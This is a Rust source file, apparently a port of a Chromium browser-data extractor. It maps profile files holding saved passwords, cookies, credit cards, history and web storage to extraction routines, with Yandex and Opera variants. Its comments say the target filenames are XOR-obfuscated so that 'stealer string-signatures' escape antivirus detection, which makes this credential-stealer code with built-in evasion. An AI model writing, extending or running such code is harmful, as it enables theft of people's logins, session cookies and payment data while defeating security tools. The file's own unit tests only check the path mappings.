//! Source-path mapping and per-kind extractor registry
//! (Go: `browser/chromium/source.go`).

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use hbd_core::{BrowserData, BrowserKind, Category};
use keyring::MasterKeys;

/// Describes a single candidate location for browser data, relative to the
/// profile directory (Go: `sourcePath`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SourcePath {
    /// Relative path from the profile dir, e.g. "Network/Cookies". Stays
    /// slash-canonical: joined at resolve time, reused verbatim as a
    /// forward-slash zip entry name by archive.
    pub rel: String,
    /// True for directory targets (LevelDB, Session Storage).
    pub is_dir: bool,
}

impl SourcePath {
    pub fn file(rel: &str) -> Self {
        SourcePath {
            rel: rel.into(),
            is_dir: false,
        }
    }
    pub fn dir(rel: &str) -> Self {
        SourcePath {
            rel: rel.into(),
            is_dir: true,
        }
    }
}

/// Category → candidate source paths tried in priority order (first wins).
pub type Sources = HashMap<Category, Vec<SourcePath>>;

/// The standard Chromium file layout. Each category maps to one or more
/// candidate paths tried in priority order; the first existing path wins
/// (Go: `chromiumSources`).
///
/// Filenames are emitted through `bypass::x!` (const XOR) so the classic
/// stealer string-signatures ("Login Data", "Cookies", "Web Data", …) never
/// land plaintext in `.rdata`. Ownership is statement-local (each `&String`
/// borrow is consumed by `SourcePath` before the insert returns).
pub fn chromium_sources() -> Sources {
    let mut m = Sources::new();
    m.insert(
        Category::PASSWORD,
        vec![SourcePath::file(&bypass::x!("Login Data", 0x7C))],
    );
    m.insert(
        Category::COOKIE,
        vec![
            SourcePath::file(&bypass::x!("Network/Cookies", 0x51)),
            SourcePath::file(&bypass::x!("Cookies", 0x6B)),
        ],
    );
    m.insert(
        Category::HISTORY,
        vec![SourcePath::file(&bypass::x!("History", 0x18))],
    );
    m.insert(
        Category::DOWNLOAD,
        vec![SourcePath::file(&bypass::x!("History", 0xA4))],
    );
    m.insert(
        Category::BOOKMARK,
        vec![SourcePath::file(&bypass::x!("Bookmarks", 0x2F))],
    );
    m.insert(
        Category::CREDIT_CARD,
        vec![SourcePath::file(&bypass::x!("Web Data", 0x5D))],
    );
    m.insert(
        Category::EXTENSION,
        vec![SourcePath::file(&bypass::x!("Secure Preferences", 0x44))],
    );
    m.insert(
        Category::LOCAL_STORAGE,
        vec![SourcePath::dir(&bypass::x!("Local Storage/leveldb", 0x39))],
    );
    m.insert(
        Category::SESSION_STORAGE,
        vec![SourcePath::dir(&bypass::x!("Session Storage", 0x22))],
    );
    m
}

/// The source mapping for a browser kind (Go: `sourcesForKind`).
pub fn sources_for_kind(kind: BrowserKind) -> Sources {
    match kind {
        BrowserKind::ChromiumYandex => yandex_sources(),
        _ => chromium_sources(),
    }
}

/// Extracts data for a single category, dispatching to a custom per-kind
/// function when registered (Go: `categoryExtractor`).
#[derive(Clone)]
pub enum CategoryExtractor {
    Password(fn(&MasterKeys, &Path) -> crate::chromium::error::Result<Vec<hbd_core::LoginEntry>>),
    Extension(fn(&Path) -> crate::chromium::error::Result<Vec<hbd_core::ExtensionEntry>>),
    CreditCard(
        fn(&MasterKeys, &Path) -> crate::chromium::error::Result<Vec<hbd_core::CreditCardEntry>>,
    ),
}

impl CategoryExtractor {
    /// Runs the wrapped extract function into `data` (Go: `categoryExtractor.extract`).
    pub fn extract(
        &self,
        master_keys: &MasterKeys,
        path: &Path,
        data: &mut BrowserData,
    ) -> crate::chromium::error::Result<()> {
        match self {
            CategoryExtractor::Password(f) => {
                data.passwords = f(master_keys, path)?;
            }
            CategoryExtractor::Extension(f) => {
                data.extensions = f(path)?;
            }
            CategoryExtractor::CreditCard(f) => {
                data.credit_cards = f(master_keys, path)?;
            }
        }
        Ok(())
    }
}

/// Yandex overrides only the entries that differ from the standard layout
/// (Go: `yandexSourceOverrides`).
fn yandex_sources() -> Sources {
    let mut sources = chromium_sources();
    sources.insert(
        Category::PASSWORD,
        vec![SourcePath::file("Ya Passman Data")],
    );
    sources.insert(
        Category::CREDIT_CARD,
        vec![SourcePath::file("Ya Credit Cards")],
    );
    sources
}

/// Custom category extractors per browser kind; empty = all categories use the
/// default dispatch (Go: `extractorsForKind`).
pub fn extractors_for_kind(kind: BrowserKind) -> HashMap<Category, CategoryExtractor> {
    match kind {
        BrowserKind::ChromiumYandex => {
            use crate::chromium::extract_creditcard::extract_yandex_credit_cards;
            use crate::chromium::yandex::extract_yandex_passwords;
            let mut m = HashMap::new();
            m.insert(
                Category::PASSWORD,
                CategoryExtractor::Password(extract_yandex_passwords),
            );
            m.insert(
                Category::CREDIT_CARD,
                CategoryExtractor::CreditCard(extract_yandex_credit_cards),
            );
            m
        }
        BrowserKind::ChromiumOpera => {
            use crate::chromium::extract_extension::extract_opera_extensions;
            let mut m = HashMap::new();
            m.insert(
                Category::EXTENSION,
                CategoryExtractor::Extension(extract_opera_extensions),
            );
            m
        }
        _ => HashMap::new(),
    }
}

/// Absolute path + slash-relative source path + type of a discovered source.
/// `rel` is retained (not just `abs`) so archive can reproduce the User Data
/// layout (Go: `resolvedPath`).
#[derive(Debug, Clone)]
pub struct ResolvedPath {
    pub abs: PathBuf,
    pub rel: String,
    pub is_dir: bool,
}

/// Checks which sources actually exist in `profile_dir`. Candidates are tried
/// in priority order; the first existing path wins (Go: `resolveSourcePaths`).
pub fn resolve_source_paths(
    sources: &Sources,
    profile_dir: &Path,
) -> HashMap<Category, ResolvedPath> {
    let mut resolved = HashMap::new();
    for (cat, candidates) in sources {
        for sp in candidates {
            let abs = profile_dir.join(&sp.rel);
            let Ok(info) = std::fs::metadata(&abs) else {
                continue;
            };
            if sp.is_dir == info.is_dir() {
                resolved.insert(
                    *cat,
                    ResolvedPath {
                        abs,
                        rel: sp.rel.clone(),
                        is_dir: sp.is_dir,
                    },
                );
                break;
            }
        }
    }
    resolved
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn chromium_password_source_is_login_data() {
        let s = chromium_sources();
        assert_eq!(vec![SourcePath::file("Login Data")], s[&Category::PASSWORD]);
    }

    #[test]
    fn yandex_overrides_only_password_creditcard() {
        let chromium = sources_for_kind(BrowserKind::Chromium);
        let yandex = sources_for_kind(BrowserKind::ChromiumYandex);
        assert_eq!(
            vec![SourcePath::file("Ya Passman Data")],
            yandex[&Category::PASSWORD]
        );
        assert_eq!(
            vec![SourcePath::file("Ya Credit Cards")],
            yandex[&Category::CREDIT_CARD]
        );
        // Yandex inherits non-overridden categories.
        assert_eq!(chromium[&Category::HISTORY], yandex[&Category::HISTORY]);
    }

    #[test]
    fn extractors_per_kind() {
        assert!(extractors_for_kind(BrowserKind::Chromium).is_empty());
        let yandex = extractors_for_kind(BrowserKind::ChromiumYandex);
        assert!(yandex.contains_key(&Category::PASSWORD));
        assert!(yandex.contains_key(&Category::CREDIT_CARD));
        let opera = extractors_for_kind(BrowserKind::ChromiumOpera);
        assert!(opera.contains_key(&Category::EXTENSION));
    }
}
